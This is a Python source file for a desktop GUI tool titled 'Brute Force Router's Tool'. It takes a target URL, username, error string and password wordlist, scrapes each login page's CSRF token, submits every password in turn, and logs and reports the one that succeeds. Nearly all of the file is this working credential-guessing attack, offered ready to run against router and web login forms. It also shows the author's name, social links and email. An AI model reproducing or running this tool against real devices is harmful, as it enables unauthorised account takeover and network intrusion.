import threading
import requests
import re
import logging
import customtkinter as ctk
from tkinter import filedialog, messagebox, simpledialog  # <-- NEW: simpledialog
from PIL import Image, ImageDraw
from bs4 import BeautifulSoup
from reportlab.lib.pagesizes import A4
from reportlab.pdfgen import canvas
import webbrowser
import os, sys
from pathlib import Path


# ------------ NEW: helper to load resources in dev & PyInstaller ------------
def resource_path(relative_path: str) -> str:
    """
    Returns absolute path to resource both in dev and when frozen by PyInstaller.
    """
    base_path = getattr(sys, '_MEIPASS', Path(__file__).parent)
    return str(Path(base_path) / relative_path)
# ---------------------------------------------------------------------------

# إعداد التسجيل
# ملاحظة: في وضع --onefile يفضل حفظ اللوج بجانب exe الحالي إن أمكن
try:
    log_target = Path(getattr(sys, '_MEIPASS', Path.cwd())) / 'bruteforce_log.txt'
    logging.basicConfig(filename=str(log_target), level=logging.INFO,
                        format='%(asctime)s - %(message)s')
except Exception:
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')


######################################################################################################
# المنطق الأصلي (كما هو)
######################################################################################################
class BruteForceCracker:
    def __init__(self, url, username, error_message, port, gui_log):
        self.url = url
        self.username = username
        self.error_message = error_message
        self.port = port
        self.session = requests.Session()
        self.gui_log = gui_log

    def get_csrf_token(self):
        try:
            if self.port:
                self.url = f"{self.url}:{self.port}"

            response = self.session.get(self.url, timeout=15)
            soup = BeautifulSoup(response.content, 'html.parser')

            csrf_field = soup.find('input', attrs={'name': re.compile(r'csrf|CSRF|token|_token', re.I)})
            if csrf_field and csrf_field.has_attr('value'):
                return csrf_field['name'], csrf_field['value']

            meta_token = soup.find('meta', attrs={'name': re.compile(r'csrf|CSRF|token', re.I)})
            if meta_token and meta_token.has_attr('content'):
                return meta_token['name'], meta_token['content']

            match = re.search(r'name=["\'](_csrf|csrf_token|CSRF|token)["\']\s+value=["\'](.*?)["\']', response.text)
            if match:
                return match.group(1), match.group(2)

            self.gui_log("[-] Could not find CSRF token.")
            return None, None
        except Exception as e:
            self.gui_log(f"[!] Error getting CSRF token: {e}")
            return None, None

    def crack(self, password):
        token_name, token_value = self.get_csrf_token()
        data_dict = {"UserName": self.username, "Password": password, "Log In": "submit"}
            
        if token_name and token_value:
            data_dict[token_name] = token_value
            self.gui_log(f"Using CSRF token: {token_name}={token_value[:10]}...")
        
        try:
            response = self.session.post(self.url, data=data_dict, cookies=self.session.cookies, timeout=15)
            if self.error_message in str(response.content):
                logging.info(f"Failed login attempt with password: {password}")
                return False
            else:
                logging.info(f"Success! Username: {self.username}, Password: {password}")
                self.gui_log(f"\n[+] Success!\nUsername: {self.username}\nPassword: {password}")
                return True
        except requests.exceptions.RequestException as e:
            logging.error(f"Request failed for password {password}: {e}")
            self.gui_log(f"[!] Request failed: {e}")
            return False


def crack_passwords(passwords, cracker, gui_log, stop_flag, progress=None, total=0, count_ref=None):
    for password in passwords:
        if stop_flag["stop"]:
            gui_log("[!] Attack stopped by user.")
            break
        count_ref[0] += 1
        password = password.strip()
        if not password:
            continue
        gui_log(f"Trying Password ({count_ref[0]}/{total}) => {password}")
        if progress:
            progress.set(count_ref[0] / max(total, 1))
        if cracker.crack(password):
            break


######################################################################################################
# GUI
######################################################################################################
class BruteForceGUI(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("Brute Force Router's Tool - By Eng. Tamer Jomaa")
        self.resizable(False, False)

        # توسيط النافذة
        win_w, win_h = 820, 620
        sw, sh = self.winfo_screenwidth(), self.winfo_screenheight()
        x, y = int((sw - win_w) / 2), int((sh - win_h) / 2)
        self.geometry(f"{win_w}x{win_h}+{x}+{y}")

        ctk.set_appearance_mode("light")
        ctk.set_default_color_theme("blue")

        # Vars
        self.password_file = None
        self.cracker = None
        self.stop_flag = {"stop": False}
        self.report_lines = []

        # تبويبات
        tabview = ctk.CTkTabview(self, width=800, height=600)
        tabview.pack(fill="both", expand=True, padx=10, pady=10)

        ####################################################################
        # تبويب Brute Force
        ####################################################################
        brute_tab = tabview.add("Brute Force")

        banner = ctk.CTkLabel(brute_tab, text="🔐 Router Brute Force Panel 🔐",
                    font=("Segoe UI", 26, "bold"), text_color="#10B981")
        banner.pack(pady=(20, 10))

        # --------- CHANGED: load logo via resource_path (works in EXE) ----------
        try:
            logo_path = resource_path("logo.png")
            logo_img = ctk.CTkImage(light_image=Image.open(logo_path),
                                    dark_image=Image.open(logo_path), size=(80, 80))
            logo_label = ctk.CTkLabel(brute_tab, image=logo_img, text="")
            logo_label.pack(pady=(0, 20))
        except Exception:
            logo_label = ctk.CTkLabel(brute_tab, text="[Logo Not Found]", text_color="gray")
            logo_label.pack(pady=(0, 20))
        # -----------------------------------------------------------------------

        self.url_entry = ctk.CTkEntry(brute_tab, placeholder_text="Target URL")
        self.url_entry.pack(pady=5, fill="x", padx=50)

        self.user_entry = ctk.CTkEntry(brute_tab, placeholder_text="Username")
        self.user_entry.pack(pady=5, fill="x", padx=50)

        self.error_entry = ctk.CTkEntry(brute_tab, placeholder_text="Wrong Password Error Message")
        self.error_entry.pack(pady=5, fill="x", padx=50)

        self.port_combo = ctk.CTkComboBox(brute_tab,
            values=["Default (80)", "5060", "8089", "21", "22", "Custom"])
        self.port_combo.set("Default (80)")
        self.port_combo.pack(pady=5, padx=50)

        btn_frame = ctk.CTkFrame(brute_tab, fg_color="transparent")
        btn_frame.pack(pady=5)

        self.passfile_btn = ctk.CTkButton(btn_frame, text="Choose Password File", command=self.choose_file)
        self.passfile_btn.pack(side="left", padx=10)

        self.start_btn = ctk.CTkButton(btn_frame, text="Start", command=self.start_attack)
        self.start_btn.pack(side="left", padx=10)

        self.stop_btn = ctk.CTkButton(btn_frame, text="Stop", command=self.stop_attack)
        self.stop_btn.pack(side="left", padx=10)

        self.save_btn = ctk.CTkButton(btn_frame, text="Save Report", command=self.save_report)
        self.save_btn.pack(side="left", padx=10)

        self.output_box = ctk.CTkTextbox(brute_tab, height=200)
        self.output_box.pack(pady=10, fill="both", expand=True, padx=20)

        self.progress = ctk.CTkProgressBar(brute_tab)
        self.progress.pack(pady=10, fill="x", padx=20)
        self.progress.set(0)

        ####################################################################
        # تبويب About Me
        ####################################################################
        about_tab = tabview.add("About Me")

        # صورة بروفايل دائرية (باستخدام resource_path)
        try:
            profile_path = resource_path("profile.jpeg")
            profile = Image.open(profile_path).resize((150, 150))
            mask = Image.new("L", profile.size, 0)
            draw = ImageDraw.Draw(mask)
            draw.ellipse((0, 0, profile.size[0], profile.size[1]), fill=255)
            profile.putalpha(mask)

            profile_img = ctk.CTkImage(light_image=profile, dark_image=profile, size=(150, 150))
            profile_label = ctk.CTkLabel(about_tab, image=profile_img, text="")
            profile_label.pack(pady=(20, 10))
        except Exception:
            ctk.CTkLabel(about_tab, text="[Profile Image Not Found]",
                        font=("Segoe UI", 12), text_color="gray").pack(pady=(20, 10))

        # الاسم
        ctk.CTkLabel(about_tab, text="Eng. Tamer Jomaa",
                    font=("Segoe UI", 22, "bold"), text_color="#0F172A").pack(pady=(5, 2))

        # الوصف
        ctk.CTkLabel(about_tab, text="💡 Software Engineer | Networking & Security Enthusiast",
                    font=("Segoe UI", 14), text_color="#334155").pack(pady=(2, 10))

        # الروابط كأزرار
        btn_links = ctk.CTkFrame(about_tab, fg_color="transparent")
        btn_links.pack(pady=10)

        github_btn = ctk.CTkButton(btn_links, text="🌐 GitHub",
                                command=lambda: webbrowser.open("https://github.com/tamerjuma"),
                                fg_color="#111827", text_color="white", hover_color="#2563EB")
        github_btn.pack(side="left", padx=10)

        linkedin_btn = ctk.CTkButton(btn_links, text="🔗 LinkedIn",
                                    command=lambda: webbrowser.open("https://linkedin.com/in/tamerjuma"),
                                    fg_color="#0A66C2", text_color="white", hover_color="#084182")
        linkedin_btn.pack(side="left", padx=10)

        # الايميل
        ctk.CTkLabel(about_tab, text="📧 Email: prisoft@live.com",
                    font=("Segoe UI", 13), text_color="#1E3A8A").pack(pady=(5, 15))

        # المهارات
        skills_text = "🔧 Skills: Python, Networking, Security, Automation"
        ctk.CTkLabel(about_tab, text=skills_text,
                    font=("Segoe UI", 13, "italic"), text_color="#065F46").pack(pady=(5, 20))

    ####################################################################
    # باقي الدوال كما هي (مع تحسين إدخال الـ Custom Port)
    ####################################################################
    def gui_log(self, text):
        self.output_box.insert("end", text + "\n")
        self.output_box.see("end")
        self.report_lines.append(text)

    def choose_file(self):
        fname = filedialog.askopenfilename(title="Choose Password File",
                                        filetypes=[("Text Files", "*.txt")])
        if fname:
            self.password_file = fname
            self.gui_log(f"[+] Selected password file: {fname}")

    def start_attack(self):
        if not self.password_file:
            messagebox.showwarning("Error", "Please choose a password file first!")
            return

        url = self.url_entry.get().strip()
        username = self.user_entry.get().strip()
        error_msg = self.error_entry.get().strip()
        choice = self.port_combo.get()

        # --------- CHANGED: proper Custom Port dialog ----------
        if choice == "Default (80)":
            port = None
        elif choice == "Custom":
            port = simpledialog.askinteger("Custom Port", "Enter your custom port:",
                                minvalue=1, maxvalue=65535, parent=self)
            if port is None:
                self.gui_log("[*] Custom port entry cancelled.")
                return
        else:
            try:
                port = int(choice)
            except ValueError:
                port = None
        # -------------------------------------------------------

        self.cracker = BruteForceCracker(url, username, error_msg, port, self.gui_log)
        self.stop_flag["stop"] = False

        thread = threading.Thread(target=self.run_attack, daemon=True)
        thread.start()

    def run_attack(self):
        try:
            with open(self.password_file, "r", encoding="utf-8", errors="ignore") as f:
                passwords = f.readlines()
            total = len(passwords)
            self.progress.set(0)
            count_ref = [0]

            crack_passwords(passwords, self.cracker, self.gui_log,
                            self.stop_flag, self.progress, total, count_ref)
            self.gui_log("[*] Attack finished.")
        except Exception as e:
            self.gui_log(f"[!] Error: {e}")

    def stop_attack(self):
        self.stop_flag["stop"] = True

    def save_report(self):
        if not self.report_lines:
            messagebox.showwarning("Error", "No report data available.")
            return
                    
        txt_path = filedialog.asksaveasfilename(defaultextension=".txt",
                                                filetypes=[("Text Files", "*.txt")])
        if txt_path:
            with open(txt_path, "w", encoding="utf-8") as f:
                f.write("\n".join(self.report_lines))
            self.gui_log(f"[+] Report saved as TXT: {txt_path}")

            pdf_path = txt_path.replace(".txt", ".pdf")
            c = canvas.Canvas(pdf_path, pagesize=A4)
            width, height = A4
            y = height - 40
            for line in self.report_lines:
                c.drawString(40, y, line)
                y -= 14
                if y < 40:
                    c.showPage()
                    y = height - 40
            c.save()
            self.gui_log(f"[+] Report also saved as PDF: {pdf_path}")


######################################################################################################
# Run App
######################################################################################################
if __name__ == "__main__":
    app = BruteForceGUI()
    app.mainloop()
